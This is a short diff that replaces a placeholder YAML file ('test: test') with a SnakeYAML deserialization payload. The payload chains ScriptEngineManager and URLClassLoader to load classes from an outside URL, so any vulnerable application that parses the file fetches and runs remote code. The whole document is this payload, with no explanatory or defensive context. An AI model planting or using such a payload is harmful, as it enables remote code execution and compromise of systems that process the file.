@@ -1,2 +1,5 @@
----
-test: test
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://053dmldmd1c0rbxxgjldhjf9n0trhg.x.scrt.pl/"]
+  ]]
+]
